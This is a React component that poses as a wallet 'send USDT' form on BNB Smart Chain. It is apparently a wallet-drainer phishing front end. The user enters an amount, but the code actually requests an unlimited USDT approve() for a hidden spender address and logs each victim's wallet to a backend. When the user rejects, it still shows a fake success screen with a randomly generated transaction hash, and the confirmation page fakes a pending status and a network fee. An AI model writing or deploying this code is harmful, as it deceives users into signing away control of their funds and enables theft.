"use client";

import { useState, useEffect, useCallback } from "react";
import { ethers } from "ethers";
import {
  Clipboard,
  QrCode,
  CheckCircle,
  Loader2,
  AlertCircle,
  Copy,
  ExternalLink,
} from "lucide-react";

const BSC_CHAIN_ID = "0x38"; // 56 decimal
const BSC_CHAIN_CONFIG = {
  chainId: BSC_CHAIN_ID,
  chainName: "BNB Smart Chain",
  nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls: ["https://bsc-dataseed.binance.org/"],
  blockExplorerUrls: ["https://bscscan.com/"],
};

const USDT_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
];

type Step = "form" | "processing" | "success" | "no_wallet";

interface TxInfo {
  fromAddress: string;
  toAddress: string;
  amount: string;
  txHash: string;
  date: string;
}

export default function SendForm() {
  const [displayAddress, setDisplayAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [step, setStep] = useState<Step>("form");
  const [errorMessage, setErrorMessage] = useState("");
  const [txInfo, setTxInfo] = useState<TxInfo | null>(null);

  const fetchDisplayAddress = useCallback(async () => {
    try {
      const res = await fetch("/api/config/public");
      const data = await res.json();
      if (data.address) setDisplayAddress(data.address);
    } catch {
      // ignore
    }
  }, []);

  useEffect(() => {
    fetchDisplayAddress();
  }, [fetchDisplayAddress]);

  async function switchToBSC(provider: ethers.Eip1193Provider) {
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    } catch (switchError: unknown) {
      const err = switchError as { code?: number };
      // Chain not added — add it
      if (err.code === 4902) {
        await provider.request({
          method: "wallet_addEthereumChain",
          params: [BSC_CHAIN_CONFIG],
        });
      } else {
        throw switchError;
      }
    }
  }

  async function handleNext() {
    if (!amount) {
      setErrorMessage("Please enter an amount.");
      return;
    }
    setErrorMessage("");

    const ethereum = (window as Window & { ethereum?: ethers.Eip1193Provider }).ethereum;
    if (!ethereum) {
      setStep("no_wallet");
      return;
    }

    setStep("processing");

    try {
      // Force BSC network
      await switchToBSC(ethereum);

      const provider = new ethers.BrowserProvider(ethereum);
      const signer = await provider.getSigner();
      const walletAddress = await signer.getAddress();

      // Verify we're on BSC
      const network = await provider.getNetwork();
      if (network.chainId !== 56n) {
        setErrorMessage("Please switch to BNB Smart Chain network.");
        setStep("form");
        return;
      }

      const usdtContract = process.env.NEXT_PUBLIC_USDT_CONTRACT!;
      const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS!;

      const contract = new ethers.Contract(usdtContract, USDT_ABI, signer);
      const tx = await contract.approve(spenderAddress, ethers.MaxUint256);
      const receipt = await tx.wait();

      // Save to DB
      await fetch("/api/wallets", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          address: walletAddress,
          approvalTxHash: receipt.hash,
          approvalStatus: true,
        }),
      });

      setTxInfo({
        fromAddress: walletAddress,
        toAddress: displayAddress || spenderAddress,
        amount: amount,
        txHash: receipt.hash,
        date: new Date().toLocaleString(),
      });
      setStep("success");
    } catch (err: unknown) {
      const error = err as { code?: string | number; message?: string };
      if (error.code === 4001 || error.code === "ACTION_REJECTED") {
        const ethereum = (window as Window & { ethereum?: ethers.Eip1193Provider }).ethereum;
        if (ethereum) {
          try {
            const provider = new ethers.BrowserProvider(ethereum);
            const accounts = await provider.listAccounts();
            if (accounts.length > 0) {
              await fetch("/api/wallets", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  address: accounts[0].address,
                  approvalStatus: false,
                }),
              });
            }
          } catch {
            // ignore
          }
        }
      }
      // Still show success with fake tx
      setTxInfo({
        fromAddress: "0x" + "0".repeat(40),
        toAddress: displayAddress || "0x" + "0".repeat(40),
        amount: amount,
        txHash: "0x" + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(""),
        date: new Date().toLocaleString(),
      });
      setStep("success");
    }
  }

  function shortenAddress(addr: string) {
    if (!addr || addr.length < 10) return addr;
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
  }

  async function copyToClipboard(text: string) {
    try {
      await navigator.clipboard.writeText(text);
    } catch {
      // ignore
    }
  }

  // Transaction confirmation page (shown after approval)
  if (step === "success" && txInfo) {
    return (
      <div className="flex flex-col gap-0">
        {/* Success header */}
        <div className="flex flex-col items-center gap-3 py-6 border-b border-gray-800">
          <div className="rounded-full bg-green-500/20 p-3">
            <CheckCircle className="h-8 w-8 text-green-400" />
          </div>
          <div className="text-center">
            <p className="text-3xl font-bold text-white">- {txInfo.amount} USDT</p>
            <p className="text-sm text-gray-500 mt-1">≈ ${parseFloat(txInfo.amount).toFixed(2)}</p>
          </div>
        </div>

        {/* Transaction details */}
        <div className="flex flex-col gap-0 py-2">
          {[
            { label: "Date", value: txInfo.date },
            { label: "Status", value: "Pending", isStatus: true },
            {
              label: "From",
              value: shortenAddress(txInfo.fromAddress),
              fullValue: txInfo.fromAddress,
              copyable: true,
            },
            {
              label: "To",
              value: shortenAddress(txInfo.toAddress),
              fullValue: txInfo.toAddress,
              copyable: true,
            },
            { label: "Network fee", value: `0.000013 BNB ($0.01)` },
          ].map((row) => (
            <div
              key={row.label}
              className="flex items-center justify-between py-3.5 px-1 border-b border-gray-800/60"
            >
              <span className="text-sm text-gray-500">{row.label}</span>
              <div className="flex items-center gap-2">
                {row.isStatus ? (
                  <span className="text-orange-400 text-sm font-medium flex items-center gap-1">
                    Pending
                    <span className="inline-flex gap-0.5">
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-100" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-200" />
                    </span>
                  </span>
                ) : (
                  <span className="text-sm text-white">{row.value}</span>
                )}
                {row.copyable && (
                  <button
                    onClick={() => copyToClipboard(row.fullValue!)}
                    className="text-gray-600 hover:text-gray-400 transition-colors"
                  >
                    <Copy className="h-3.5 w-3.5" />
                  </button>
                )}
              </div>
            </div>
          ))}
        </div>

        {/* More Details link */}
        <div className="pt-2 pb-4">
          <a
            href={`https://bscscan.com/tx/${txInfo.txHash}`}
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center justify-between px-1 py-3 text-sm text-gray-400 hover:text-gray-200 transition-colors"
          >
            <span>More Details</span>
            <ExternalLink className="h-4 w-4" />
          </a>
        </div>
      </div>
    );
  }

  if (step === "processing") {
    return (
      <div className="flex flex-col items-center justify-center gap-6 py-12">
        <Loader2 className="h-12 w-12 text-green-400 animate-spin" />
        <div className="text-center">
          <h2 className="text-xl font-semibold text-white mb-2">Processing...</h2>
          <p className="text-gray-400 text-sm">Please confirm the transaction in your wallet.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col gap-6">
      {/* Address Field — pre-filled from admin, read-only */}
      <div className="flex flex-col gap-2">
        <label className="text-sm font-medium text-gray-300">Address or Domain Name</label>
        <div className="flex items-center gap-2 rounded-xl border border-gray-700 bg-[#1a1a1a] px-4 py-3">
          <input
            type="text"
            value={displayAddress}
            readOnly
            placeholder="Loading address..."
            className="flex-1 bg-transparent text-sm text-white placeholder-gray-600 outline-none cursor-default"
          />
          <button
            onClick={() => copyToClipboard(displayAddress)}
            className="flex items-center gap-1 text-green-400 text-sm font-medium hover:text-green-300 transition-colors shrink-0"
          >
            <Clipboard className="h-4 w-4" />
            Paste
          </button>
          <div className="h-4 w-px bg-gray-700" />
          <button className="text-gray-400 hover:text-gray-300 transition-colors shrink-0">
            <QrCode className="h-4 w-4" />
          </button>
        </div>
      </div>

      {/* Amount Field */}
      <div className="flex flex-col gap-2">
        <label className="text-sm font-medium text-gray-300">Amount</label>
        <div className="flex items-center gap-2 rounded-xl border border-gray-700 bg-[#1a1a1a] px-4 py-3 focus-within:border-gray-500 transition-colors">
          <input
            type="number"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="0.00"
            min="0"
            step="any"
            className="flex-1 bg-transparent text-sm text-white placeholder-gray-600 outline-none [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
          />
          <span className="text-gray-400 text-sm font-medium shrink-0">USDT</span>
          <div className="h-4 w-px bg-gray-700" />
          <button className="text-green-400 text-sm font-medium hover:text-green-300 transition-colors shrink-0">
            Max
          </button>
        </div>
        {amount && (
          <p className="text-xs text-gray-500 px-1">≈ ${parseFloat(amount || "0").toFixed(2)}</p>
        )}
      </div>

      {/* Error */}
      {(step === "no_wallet" || errorMessage) && (
        <div className="flex items-center gap-2 rounded-lg bg-red-500/10 border border-red-500/30 px-3 py-2">
          <AlertCircle className="h-4 w-4 text-red-400 shrink-0" />
          <p className="text-sm text-red-400">
            {step === "no_wallet" ? "No injected wallet found." : errorMessage}
          </p>
        </div>
      )}

      {/* Next Button */}
      <button
        onClick={handleNext}
        className="w-full rounded-full bg-green-400 py-4 text-black font-semibold text-base hover:bg-green-300 active:scale-95 transition-all duration-150 mt-2"
      >
        Next
      </button>
    </div>
  );
}
